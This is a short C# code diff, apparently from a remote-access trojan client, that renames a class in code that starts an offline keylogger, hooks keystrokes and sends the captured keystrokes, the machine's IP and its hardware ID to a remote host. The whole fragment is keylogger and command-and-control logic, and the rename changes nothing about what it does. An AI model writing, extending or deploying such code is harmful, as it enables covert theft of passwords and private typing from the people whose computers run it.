@@ -51,9 +51,9 @@ namespace Client
         public void ConnectStart()
         {
             Thread.Sleep(250);
-            if (!StarterClass.KeylogOn && Config.offKeylog != "False") 
+            if (!EntryClass.KeylogOn && Config.offKeylog != "False") 
             {
-                StarterClass.StartOfflineKeylogger();
+                EntryClass.StartOfflineKeylogger();
             }
             connectAsync = new ConnectAsync(Connect);
             connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
@@ -75,9 +75,9 @@ namespace Client
         private void StopOfflineKeyLogger()
         {
             Plugin.Launch.StopHook();
-            Plugin.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID));
+            Plugin.Launch.ClientSender(EntryClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), EntryClass.clientHandler.baseIp, EntryClass.clientHandler.HWID));
             Plugin.Launch.ClearKeyStroke();
-            StarterClass.KeylogOn = false; 
+            EntryClass.KeylogOn = false; 
         }
 
         public void EndConnect(IAsyncResult ar) 
@@ -90,7 +90,7 @@ namespace Client
                 this.HWID = connectionPacket.HWID;
                 this.baseIp = socket.LocalEndPoint.ToString();
                 SendPacket(connectionPacket);
-                if (StarterClass.KeylogOn)
+                if (EntryClass.KeylogOn)
                     StopOfflineKeyLogger();
                 Receive();
             }
